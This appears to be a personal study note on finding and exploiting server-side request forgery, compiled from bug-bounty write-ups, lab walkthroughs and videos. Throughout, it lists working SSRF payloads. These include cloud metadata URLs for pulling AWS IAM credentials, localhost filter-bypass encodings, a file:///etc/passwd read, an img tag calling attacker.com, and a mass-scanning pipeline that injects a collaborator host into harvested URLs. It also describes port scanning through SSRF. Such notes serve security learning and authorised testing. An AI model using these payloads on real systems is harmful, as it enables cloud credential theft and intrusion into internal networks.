---
created: 2024-09-27T16:14
updated: 2024-11-27T23:54
---

cheat sheet: [SSRF cheat sheet for AWS, GCP and Azure - by DH (pentesting.academy)](https://pentesting.academy/p/ssrf-cheat-sheet-for-aws-gcp-and)

![[Pasted image 20250618193710.png]]

⚡️SSRFUtility - SSRF Exploitation Tool 
🔗 https://ssrf.cvssadvisor.com/

#SSRF

🕷️ Mastering SSRF: A Step-by-Step Guide to Finding and Exploiting Server-Side Request Forgery


Server-Side Request Forgery (SSRF) is a powerful vulnerability that occurs when a server fetches external resources based on user input. If exploited, it can lead to data leakage, access to internal systems, or even full infrastructure compromise.

Here’s a step-by-step guide to discovering and exploiting SSRF vulnerabilities:


━━━━━━━━━━━━━━━━━━


🔍 1. Identify Entry Points
Start by locating areas where the application sends outbound requests. Common sources include:

🔘Link previews

🔘File upload/download functionalities

🔘Webhooks

🔘PDF or image generation

🔘URL fetchers for screenshots or validators

If HTML or external content is processed, injecting a malicious URL can trick the server into making a request to your controlled endpoint.

Example:

```bash
<img src="http://attacker.com/payload"/>
```


━━━━━━━━━━━━━━━━━━

🧪 2. Analyze Error Responses
Test the server’s behavior by sending malformed URLs and observe the error responses:

🔘Connection refused

🔘Invalid hostname

🔘HTTP status codes like 403, 404, 500

These clues indicate whether the server is trying to make external requests.

Test Payloads:


http://invalid-url
http://example.local
http://127.0.0.1:9999


━━━━━━━━━━━━━━━━━━


🏠 3. Target Internal Resources
Once confirmed, aim for internal IP ranges such as:

🔘127.0.0.1

🔘10.x.x.x

🔘192.168.x.x

These often expose admin panels, internal APIs, or development services. Port scanning via SSRF is also possible by analyzing different response behaviors.

Example:


http://127.0.0.1:8000/admin


━━━━━━━━━━━━━━━━━━

😈  4. Access Cloud Metadata Services
In cloud environments (AWS, Azure, GCP), internal metadata endpoints may leak sensitive info like access keys and tokens.

Payloads:

🔘AWS:
 
http://169.254.169.254/latest/meta-data

🔘Azure:
 
http://169.254.169.254/metadata/instance?api-version=2021-02-01

Be sure to include necessary headers if required (e.g., Metadata: true for Azure).



━━━━━━━━━━━━━━━━━━


😀 5. Bypass Filters and WAFs
If filters are in place, use bypass techniques:

🔘URL encoding:

http://127%2E0%2E0%2E1

🔘Decimal IP: 

http://2130706433 (equals 127.0.0.1)


🔘IPv6 format:  

http://[::]

🔘Use redirections through open servers

Pro Tip: Use DNS rebinding or SSRF chaining with redirect-capable endpoints.


━━━━━━━━━━━━━━━━━━


👁 6. Exploit Blind SSRF
In blind SSRF cases, you won’t get visible feedback. Use external monitoring tools to detect interactions:

🔘Burp Collaborator

🔘Webhook.site

🔘Custom DNS loggers

Example:

> http://your-collaborator-url.com

Monitor for DNS or HTTP logs to confirm server-side interaction. 

---
## Example 1:

resource: [An exciting journey to find SSRF , Bypass Cloudflare , and extract AWS metadata ! | by hosein vita | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/an-exciting-journey-to-find-ssrf-bypass-cloudflare-and-extract-aws-metadata-fdb8be0b5f79)

# What is ssrf ?

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing.

# The story:

after a little bit working around this program I came to an endpoint which was some thing like this ~> [https://redacted.com/api/download-pdf?url=](https://api.onupkeep.com/api/download-pdf?url=http%3A%2F%2Fc1ef8684bfb2.ngrok.io)”http://SomeThing.com”.

I immediately fired up my burp collaborator and replace the default url with mine , fortunately my burp collaborator received HTTP and DNS requests and I got the burp page in response.

![](https://miro.medium.com/v2/resize:fit:875/1*gmcw0r2ApTsHxT_ZuCWhug.png)

After , first thing came to my mind was, let’s put [http://localhost](http://localhost/) there to get interesting response !

but I got :

![](https://miro.medium.com/v2/resize:fit:875/1*VQMBJahcGdi9fvIpsJKbpQ.png)


There was a protection for this one , but i didn’t give up and i went through all the way’s to bypass localhost restriction , I tried all of these payloads :

> [http://127.0.0.1:80](http://127.0.0.1/)
> 
> [http://127.0.0.1:443](http://127.0.0.1:443/)
> 
> [http://127.0.0.1:22](http://127.0.0.1:22/)
> 
> [http://127.1:80](http://127.0.0.1/)
> 
> [http://0](http://0.0.0.0/)
> 
> [http://0.0.0.0:80](http://0.0.0.0/)
> 
> [http://localhost:80](http://localhost/)
> 
> [http://[::]:80/](http://[::]/)
> 
> [http://[::]:25/](http://[::]:25/) SMTP
> 
> [http://[::]:3128/](http://[::]:3128/) Squid
> 
> [http://[0000::1]:80/](http://[::1]/)
> 
> [http://[0:0:0:0:0:ffff:127.0.0.1]/thefile](http://[::ffff:7f00:1]/thefile)

And lot’s of other’s which you can find in ~> [https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery).

Even i tried other protocols like : “file:///” , “sftp://” , “gopher://” and so on .

None of them works ! :(

After a while something triggers my mind , that why not trying “http://169.254.169.254/” for retrieving AWS metadata instances ?.

So i did that and i got :

![](https://miro.medium.com/v2/resize:fit:875/1*gkMWbL-6WxJHbrhpL2aopg.png)

							Cloudflare everywhere ! :@


— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

from: [What is this IP address: 169.254.169.254?](https://serverfault.com/questions/427018/what-is-this-ip-address-169-254-169-254)

In ec2, each instance can get meta-data regarding their own by making HTTP requests to this IP.

```
$ curl -s http://169.254.169.254/user-data/
```

These are [dynamically configured link-local addresses](https://www.rfc-editor.org/rfc/rfc3927). They are only valid on a single network segment and are not to be routed.

Of particular note, 169.254.169.254 is used in [AWS](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html), [Azure](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=windows), [GCP](https://cloud.google.com/compute/docs/metadata/querying-metadata) and other <mark style="background: #FFB86CA6;">cloud computing platforms to host instance metadata service.</mark>

## Quick SSRF Mass Hunting Methodology:

#SSRF 

-- collect subs and alive ones.

```bash
cat all-live.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allUrls.txt
```


```bash
cat allUrls.txt | grep "=" | qsreplace http://troupga5ke78yjdu4hv12s1v2m8dw3ks.oastify.com > ssrf.txt
```

```
cat ssrf.txt | httpx -fr
```

- -fr is for follow redirect.

_If any url is vulnerable to SSRF will be show in burp collaborator.

![](https://miro.medium.com/v2/resize:fit:875/1*rdOcMPLSLLB3_rld31mC2A.png)

## Step 6: How to check which URL is vulnerable

Once you confirmed that ssrf.txt file contains a URL which is vulnerable to SSRF.

Divide the File in multiple files with the following command

```
split -l 10 ssrf.txt output_file_prefix
```

The above command going to create 10 different file.  
Clear the Burp Collaborator first.  
Check each file with the same command mentioned in step 5.

**If any interaction shown check each URL manually. (If this file is big, again split it)**

That’s all. You get your SSRF vulnerable URL.

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

I continued researching till i found this one :

> It might be possible that the server is **filtering the original request** of a SSRF **but not** a possible **redirect** response to that request. For example, a server vulnerable to SSRF via: `url=https://www.google.com/` might be **filtering the url param**. But if you uses a [python server to respond with a 302](https://pastebin.com/raw/ywAUhFrv) to the place where you want to redirect, you might be able to **access filtered IP addresses** like 127.0.0.1 or even filtered **protocols** like gopher.


— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 


Spiegato in italiano:

l’attaccante induce l’applicazione a effettuare una richiesta HTTP verso il server che ospita l’applicazione, tramite la sua interfaccia di rete di loopback. [Questo coinvolge tipicamente l’inserimento di un URL con un nome host come 127.0.0.1 (un indirizzo IP riservato che punta all’adattatore di loopback) o localhost (un nome comunemente usato per lo stesso adattatore)](https://portswigger.net/web-security/ssrf) [1](https://portswigger.net/web-security/ssrf).

Nel tuo esempio, se il server sta filtrando il parametro URL originale ma non la risposta di reindirizzamento, potresti utilizzare un server Python per rispondere con un codice di stato 302 (reindirizzamento) verso il luogo in cui desideri reindirizzare. [In questo modo, potresti essere in grado di accedere a indirizzi IP filtrati come 127.0.0.1 o persino a protocolli filtrati come gopher](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.md) [2](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.md).

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 


So i fired up my django server and insert this code to my server :

![](https://miro.medium.com/v2/resize:fit:875/1*e31Q2Lv-7PkGsXp2-XXzoQ.png)

					I used ngrok to connect to my server.

I sent this request and i got the prod then i put the prod in my django server after “[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/')YOUR-PROD-HERE”,

And Finally I got :

![](https://miro.medium.com/v2/resize:fit:875/1*JMuS6hwwFLjPnSIBpruL_g.jpeg)


---

Explanation of SSRF:

![[Pasted image 20240928123239.png]]

in blind the response is simply not displayed back to you:

![[Pasted image 20240928123253.png]]

![[Pasted image 20240928124539.png]]

![[Pasted image 20240928124500.png]]

_in order to prove that a vulnerability exists you need to force the application  to make a DNS or an HTTP request **to an attacker controlled server** like burp collaborator and if you get the request on your server that means **the vulnerability actually exists**_

#source: https://youtu.be/Gk3_Q-3R6jc

_the first thing to look at, is to see where that request is coming from, if is coming from a server or is just my browser which is doing that request (**if it comes from your browser then you're not going to be able to access that data and is already game over**)_


somethimes ssrf allows you to actually read files:

you just have to give a path with a file protocol

-> file:///etc/passwd

![[Pasted image 20240928115716.png]]

or just type **http://localhost** and see if it returns something like "status : ok" or something similar

Try to leak **keys** via ip followed by metadata  (generally it works via PDF generators websites )

![[Pasted image 20240928120313.png]]

if it says "not found" try this one with v1:

![[Pasted image 20240928120659.png]]

![[Pasted image 20240928120629.png]]

			output


If some web services are runned on cloud, you could send some GET requests tha run metadata:

![[Pasted image 20240928180916.png]] 

## Upload a file with a payload inside:

we create a file, index.php and then put a simlple payload where which, makes a metadata request so it may **leak public keys**

![[Pasted image 20240928121928.png]]

then we simply pu the domain followed by the path of our file index.php

![[Pasted image 20240928121742.png]]


Tips for searching for ssrf:  

1. if you're given an url where it gives you the ability to integrate your own stuff for example  if there's web hooks integration with third-party tools, ==PDF generators==  or maybe **they let you design your own code like you're working with HTML code and takes a screenshot of it and then shows you the output** those are usually good places to search for ssrf

or images with urls:

![[Pasted image 20240928180617.png]]

---

make a request:

simply click on request stock:

![[Pasted image 20240928131125.png]]

We can see the payload, so we send it to Decoder, just right click

![[Pasted image 20240928131044.png]]

And decode as URL to se ethe url easier:

![[Pasted image 20240928131312.png]]

Now all we want to do is re-direct the URL to our malicious one:

![[Pasted image 20240928131859.png]]

! if it dosen't work encode it with URL encoding

![[Pasted image 20240928132031.png]]


By clicking on "render" on the response section, we could see if we're admin:

![[Pasted image 20240928132121.png]]

##  Exploit Blind SSRF with Out-of-Band Detection

This is the same thing, but we don't get any of the button to make a request, so we simply visit the page:

![[Pasted image 20240928132724.png]]

visit the request: ![[Pasted image 20240928132747.png]]

-> send to repeater

in this case we don't have any of the URLs or partial URLs in the body page but we can see that we actually have one in the referer header:

![[Pasted image 20240928132632.png]]

So all we can do is take that url out and replace it with our collaborator payload and add "http://"

![[Pasted image 20240928133019.png]]

![[Pasted image 20240928134630.png]]

and we can verify the vulnerability by going to collaborator and "pool now" and se eif we actually have DNS or HTTP requests:


![[Pasted image 20240928134414.png]]

if you want to do this without using burp collaborator:

you can go to webhook.site and copy the first URL where we can send traffic and inspect the requests and replace it to the Referer header:

![[Pasted image 20240928134726.png]]

to exploit this we can use curl:

-> curl <*url by webhook.site*>

we can see the URL and the body request:

![[Pasted image 20240928135121.png]]

we can verify the exploit  by sending a message to the url:

![[Pasted image 20240928135351.png]]
![[Pasted image 20240928135416.png]]


! somethimes you may actually find ssrf but you won't be able to actually exploit it, but you may still want to flag it, if you're in a pent-test, you say that you weren't able to exploit it but in the future it may be a problem.


**Tip:** after finding the exploit, try to scan the network ports by modifing the url and adding ":25" to scan the network port 25  (wich is SMTP protcol)

![[Pasted image 20240928165736.png]]

![[Pasted image 20240928165646.png]]

-> send the request -> go to burp collaborator and do "poll now"

![[Pasted image 20240928170014.png]]

if it answers and the port exists, then the network port exists.

! You can do this with other many ports like 22 (SSH) 20/21, 80, 123, 443 ecc..

**TIP 2°:** After you manage to exploit the website with the payload, you should discover the website internal IP, so try scanning that with nmap:

![[Pasted image 20240928170430.png]]

![[Pasted image 20240928170459.png]]

----

#source: [An overlooked parameter leads to a critical SSRF in Dropbox bug bounty program - YouTube](https://www.youtube.com/watch?v=sMk5ajkJO5o)

<iframe width="696" height="392" src="https://www.youtube.com/embed/sMk5ajkJO5o" title="An overlooked parameter leads to a critical SSRF in Dropbox bug bounty program" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

HelloSign must somehow access files from your drive, and there are a few ways to do this, but let's see how it worked in this example:

first you need to auth in the WebApp and autorize HelloSign to access your files

![[Pasted image 20241127222040.png]]

Then this iframe pops up with the list of your files:

![[Pasted image 20241127222747.png]]
But when you finally choose a file that you would like to sign, the iframe sends a POST message to HelloSign which contains the file ID of the file that you've chosen:

![[Pasted image 20241127222936.png]]

Then you send a request with this file ID to HellowSign and HwlloSign communicates with Google Drive API to fetch this file on the server and then serves you the file

![[Pasted image 20241127223909.png]]

So HelloSign here acts as a proxy.
But let's see what actually hellosign does to fetch this file.

![[Pasted image 20241127224349.png]]

This is the google Drive API endpoint to serve a file. It contains the file ID which you had to HelloSign server first, but this endpoint does not respond directly with a file content.

![[Pasted image 20241127224523.png]]

which is an actual address to the file contents

So HelloSign or the WebApp must make another request to this  URL, to fetch the file, which can eventually be served to you:

![[Pasted image 20241127224953.png]]

So the WebApp makes two requests and whenever you have a functionality where the server makes HTTP request to the URL which you, at least partially control, you should be thinking about **SSRFs** - **about the possibility to trick the server into sending these requests to other locations**


![[Pasted image 20241127225856.png]]


And we you look at these addresses, the second one dosen't seem under our controll at all because we can't influence the URL where our file is stored by google Drive. The first one is a bit better, because at least we control the file ID but unfortunately, it's not possible to trick the server, however, what you can try, is to try controlling the path and parameters of the request.

To discover that, you could look for a reference, for an endpoint that could give us an example, like an open redirect

At first, we may not find anything, however, if you scroll up to the top e can find the "alt=media parameter"

![[Pasted image 20241127231341.png]]


but it returns, the file itself, **If HelloSign application would use this parameter, theyy wouldn't have to make two requests to first fetch the metadata and then fetch the file, but they could fetch the file with a single request**

So let's think what happens if we would have to inject this parameter, into the file ID and it would be *encoded properly*

Well.. the server would return a whole file to the first request by helloSign

![[Pasted image 20241127232218.png]]

So helloSign will parse the entire file, thinking is metadata! and the WebApp won't know about it, But all you can do with an image or a pdf, is to force a JSON parsing error, - nothing interesting,


But if you do this to an actuall valid JSON, then HelloSign will try to parse this JSON, extracting data like the title and other metadata from the file:

![[Pasted image 20241127232541.png]]

![[Pasted image 20241127232741.png]]

And most importantly, it would also extract the **DownloadUrl** and send a request to this address, **to then, fetch you a response.**

So this is a full-read SSRF:

![[Pasted image 20241127232712.png]]

You can trick the server to send the request to arbitrary locations and the server gives you the response

## Impact

![[Pasted image 20241127233402.png]]

Since the application is hosted on AWS, you can see the AWS metadata URL which contains AWS credentials and you can use it to log-in into the server.

! This vuln was classified as critical and rewarded over 17,500$

So if you  discover  sites that use Google Drive API to transfer files and fetches files from the server   u should probably add the "alt=media" parameter to the file ID, to see what happens, if you see an error, particularly about JSON parsing, then it's a good change, that you just found an SSRF

After that you should prepare a JSON  that looks like a metadata about the file, for that you can refer to the Google Drive API documentation


![[Pasted image 20241127235344.png]]

---

### Comprehensive esploration of SSRF:

#source: https://youtu.be/6Y5ZpxjThNg?t=1656

<iframe width="928" height="522" src="https://www.youtube.com/embed/6Y5ZpxjThNg" title="Behind the Scenes of SSRF: A Comprehensive Exploration - Rajveersinh Parmar" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
![[{9F6693DB-A3A2-457B-A7F6-F2EB0317004C}.png]]


<iframe width="928" height="522" src="https://www.youtube.com/embed/0GxsUS1P5xs" title="What functionalities are vulnerable to SSRFs? Case study of 124 bug bounty reports" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

Video reference: https://www.youtube.com/watch?v=eVI0Ny5cZ2c


Blind SSRF: https://www.youtube.com/watch?v=AzBAHw6FZto

Hunting for SSRF Bugs in PDF Generators
https://www.blackhillsinfosec.com/hunting-for-ssrf-bugs-in-pdf-generators


https://www.youtube.com/watch?v=O6_CIH8dTwI  easy way to find SSRF


https://pswalia2u.medium.com/ssrf-4ccd948c3c1b?source=read_next_recirc-----6bc98fc5c1cc----1---------------------ffe982de_1e60_47d3_bff9_7e0d064092e6-------

https://medium.com/@kerstan/my-ssrf-tricks-bug-bounty-tuesday-f0d7e53c8d88?source=read_next_recirc-----47fa16c4ef34----2---------------------ce0618fd_530e_4f10_a4f4_12ee1aabe134-------


SSRF to fetch AWS credentials?

https://www.youtube.com/watch?v=HG60jjR4a-Q

https://www.youtube.com/watch?v=uDvAexrTVGI SSRF example

Prevent SSRF in node.js:

https://www.youtube.com/watch?v=fC6CFSN9BPI


easy way to find SSRF:   https://www.youtube.com/watch?v=zP0S8u0-BCE

<iframe width="711" height="400" src="https://www.youtube.com/embed/zP0S8u0-BCE" title="Easy way to Find SSRF  cve+manually+Automation | Bug bounty poc" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

https://www.youtube.com/watch?v=wflibs2jAos


## Advanced SSRF Attacks: Bypass Blacklisted Filters

#source: https://www.youtube.com/watch?v=cAz9LyYiIlY

----

##   How To Exploit SSRF To Fetch AWS Credentials

-  make sure the website is hosted on AWS by using Wappalyzer

  [![](https://www.gstatic.com/youtube/img/watch/social_media/medium_1x.png) / bypassing-ssrf-protection-to-exfiltrate-aw...](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa3lUSkdIWFpQVVN3UTZLa2tqbkxYRzNnTThBQXxBQ3Jtc0tsX0k2d0g0M29yWFhxUUdIeVU1VzBXbDJySEpWV3hOdmdSYlREUXU3aGpDaFJzSmRJcjNqc01ka3FlVWs1RUhQWktCNVRpZmNLRlRYQUVoYzE3Qmw1NkZjdGZXTFA4dnRUOEZWRmpINmN1NFZneW80Yw&q=https%3A%2F%2Fsirleeroyjenkins.medium.com%2Fbypassing-ssrf-protection-to-exfiltrate-aws-metadata-from-larksuite-bf99a3599462&v=HG60jjR4a-Q)    
   [![](https://www.gstatic.com/youtube/img/watch/social_media/medium_1x.png) / ssrf-attack-leading-to-aws-metadata](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa0hNcU00T2hQalVoeXY4V3o1Mmh5amhlRWNCd3xBQ3Jtc0trb3ZGUVVzWk5JZjBVMDVFcEpNczFUQkQ2MzlkQnQwdXdzNDNhU01pbnNmNTd1ZXBMb3haN01Rd3VhdWstSzJvOE9MelQ4ME44MzNqQndVcE5LaWVxQXpIX2R3U0NDdlZWVlVKaXVvTVhNRG5FY2lXaw&q=https%3A%2F%2Fmedium.com%2F%40Parag_Bagul%2Fssrf-attack-leading-to-aws-metadata-e95155fa6c6f&v=HG60jjR4a-Q)   
   
   [https://hackerone.com/reports/1624140](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa3R1Z0FFNUpldlM2ZTZLUmZUSTF2X202alJjQXxBQ3Jtc0ttNmprWTJwMG1fYmRZSnZvYVBvcnQ1cVkwTUlLd0laV2RoN3c4bExzcHlUVVViRk1YWjJJaTl2bmVydkotWXFrWDNQTXVmVTlNeGVCNUJWbHlNS1RrbHJxVlA1d2tzQkV0LXhPRjU1VV9SY19FaXBoOA&q=https%3A%2F%2Fhackerone.com%2Freports%2F1624140&v=HG60jjR4a-Q)

from here with have a function that fetches our urls 

![[Pasted image 20240928183248.png]]
and we can see that it does fetch the image.

![[Pasted image 20240928183426.png]]

*supposively we take a look at the code*

python code made with flask:

The vulnerability here is that it does not validate any URL **takes any URLs and fetches the image**

![[Pasted image 20240928181933.png]]

now if you want to check if an application is making requests to external resources which it is not allowed to do so you can use interactsh

Interactsh is an **open-source tool developed by ProjectDiscovery for detecting out-of-band (OOB) vulnerabilities**.

link: [GitHub - projectdiscovery/interactsh: An OOB interaction gathering server and client library](https://github.com/projectdiscovery/interactsh)

after installing it, simply copy the url and add http:// if the application makes a request, you will see it

![[Pasted image 20240928183019.png]]

![[Pasted image 20240928183530.png]]

## What is AWS Metadata?

EC2 instance: an EC2 instance is like a virtual computer in the cloud provided by amazon web services (AWS) this computer has its own IP and this is called Magic IP

So this IP is used to access  instance for metadata **and user data from within an EC2 instance**  So this IP address is used to retrieve various configuration details credentials and other metadata. 

This EC2 instance should be accesible only inside the EC2 instance or  AWS

![[Pasted image 20240928184116.png]]

now if you find a parameter like this:

![[Pasted image 20240928184458.png]]

you could provide a url like this after the '='  to try fetching for metadata:

![[Pasted image 20240928185752.png]]

![[Pasted image 20240928185625.png]]

And if is vulnerable as output will return something like this:

![[Pasted image 20240928185938.png]]

You can search for IAM info by using this payload:

![[Pasted image 20240928190039.png]]

and it will give you the IAM role id and role name.

Once you have the ROLE-NAME you can use this url:

![[Pasted image 20240928190208.png]]

to fetch more info about that particular role like access key id token and secret access key
![[Pasted image 20240928190245.png]]

! this is very sensitive because it permits you to perform **unauthorized access of your AWS resource**  like reading data from S3 buckets, launching or terminating EC2 instaces.

<mark style="background: #FF5582A6;">! This vulnerability can be from 9 to 10 from the CVSS score</mark>

---

#source: https://www.youtube.com/watch?v=zzHqBuACwBk


<iframe width="928" height="522" src="https://www.youtube.com/embed/zzHqBuACwBk" title="Mastering Web Exploitation:Python Scripting for Blind SSRF and Out-of-Band Data Exfiltration via XXE" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

A simple showcase of POC:

<iframe width="928" height="522" src="https://www.youtube.com/embed/uDvAexrTVGI" title="SSRF Vulnerability | Bug Bounty POC" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---


POC: https://www.youtube.com/watch?v=90AdmqqPo1Y bypass ssrf by DNS rebinding

by lostsec:
<iframe width="928" height="522" src="https://www.youtube.com/embed/DUwH2fuobaw" title="SSRF Bypass by DNS Rebinding | Bug bounty poc" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

POC: 4000 dollars srrf: https://www.youtube.com/watch?v=apzJiaQ6a3k


cve via parse url for ssrf https://www.youtube.com/watch?v=_avYi3_Lm9A


https://www.youtube.com/watch?v=Iq6ThCmUTOU


cve ssrf: https://www.youtube.com/watch?v=_avYi3_Lm9A


<iframe width="928" height="522" src="https://www.youtube.com/embed/O6_CIH8dTwI" title="Easy way to Find SSRF manually+Automation  | Bug bounty poc" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>